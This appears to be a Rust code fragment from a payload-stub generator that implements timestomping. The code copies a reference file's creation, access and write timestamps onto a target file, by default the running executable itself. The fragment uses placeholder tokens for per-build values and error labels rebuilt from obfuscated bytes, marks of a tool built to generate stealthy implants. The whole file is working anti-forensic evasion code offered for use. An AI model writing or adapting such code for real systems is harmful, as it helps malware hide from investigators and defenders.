// --- Timestomping (technique fragment) ---
//
// This file is injected verbatim into the generated stub's `mod step_<index>`
// when the technique is selected, so it is self-contained: its own `use` items,
// constants and helpers, all resolved inside that module.
//
// Per-build values use the technique's placeholder tokens, substituted by
// `Params::render_fragment` (see `mod.rs`); the tokens are not valid Rust
// identifiers, so nothing can rewrite them silently.

use core::ptr;

use windows::core::PCWSTR;
use windows::Win32::Foundation::{CloseHandle, FILETIME, HANDLE};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, GetFileTime, SetFileTime, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ,
    FILE_SHARE_DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_WRITE_ATTRIBUTES, OPEN_EXISTING,
};

/// A path as a NUL-terminated UTF-16 buffer for the `CreateFileW` calls.
fn to_wide(path: &str) -> Vec<u16> {
    let mut wide: Vec<u16> = path.encode_utf16().collect();
    wide.push(0);
    wide
}

/// Opens the reference file for reading its timestamps.
fn open_for_read(path: &str) -> Result<HANDLE, String> {
    let wide = to_wide(path);
    // SAFETY: `wide` is NUL-terminated and outlives the call; no security
    // attributes are passed and there is no template file.
    unsafe {
        CreateFileW(
            PCWSTR(wide.as_ptr()),
            FILE_GENERIC_READ.0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE(ptr::null_mut()),
        )
        .map_err(|e| win_error($MSG_OPEN_REF_FAILED$, e.code().0))
    }
}

/// Opens the target file for changing its timestamps.
fn open_for_write_attributes(path: &str) -> Result<HANDLE, String> {
    let wide = to_wide(path);
    // SAFETY: as `open_for_read`.
    unsafe {
        CreateFileW(
            PCWSTR(wide.as_ptr()),
            FILE_WRITE_ATTRIBUTES.0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE(ptr::null_mut()),
        )
        .map_err(|e| win_error($MSG_OPEN_TARGET_FAILED$, e.code().0))
    }
}

/// Reads the reference file's three timestamps.
fn read_reference(path: &str) -> Result<(FILETIME, FILETIME, FILETIME), String> {
    let handle = open_for_read(path)?;
    let mut creation = FILETIME::default();
    let mut access = FILETIME::default();
    let mut write = FILETIME::default();
    // SAFETY: the three out-pointers are valid for the duration of the call and
    // `handle` is valid.
    let result = unsafe {
        GetFileTime(
            handle,
            Some(&mut creation as *mut FILETIME),
            Some(&mut access as *mut FILETIME),
            Some(&mut write as *mut FILETIME),
        )
    };
    let _ = unsafe { CloseHandle(handle) };
    result.map_err(|e| win_error($MSG_GET_TIME_FAILED$, e.code().0))?;
    Ok((creation, access, write))
}

/// Writes the three timestamps onto the target file.
fn apply_times(path: &str, times: (FILETIME, FILETIME, FILETIME)) -> Result<(), String> {
    let handle = open_for_write_attributes(path)?;
    let (creation, access, write) = times;
    // SAFETY: the three in-pointers are valid for the duration of the call and
    // `handle` is valid.
    let result = unsafe {
        SetFileTime(
            handle,
            Some(&creation as *const FILETIME),
            Some(&access as *const FILETIME),
            Some(&write as *const FILETIME),
        )
    };
    let _ = unsafe { CloseHandle(handle) };
    result.map_err(|e| win_error($MSG_SET_TIME_FAILED$, e.code().0))
}

/// Appends a Win32 status to a label (which is rebuilt from obfuscated bytes at
/// the call site, so this literal carries no diagnostic text).
fn win_error(label: String, code: i32) -> String {
    format!("{label} (0x{:08x})", code as u32)
}

/// Copies the reference file's timestamps onto the target file. Returns
/// `Ok(true)`: a preparation always lets the chain continue.
pub fn timestomping() -> Result<bool, String> {
    let reference: String = $REFERENCE_DEF$;
    let target: Option<String> = $TARGET_DEF$;

    let target_path: String = match target {
        Some(path) => path,
        None => std::env::current_exe()
            .map_err(|_| $MSG_SELF_PATH_FAILED$)?
            .to_string_lossy()
            .into_owned(),
    };

    let times = read_reference(&reference)?;
    apply_times(&target_path, times)?;
    Ok(true)
}
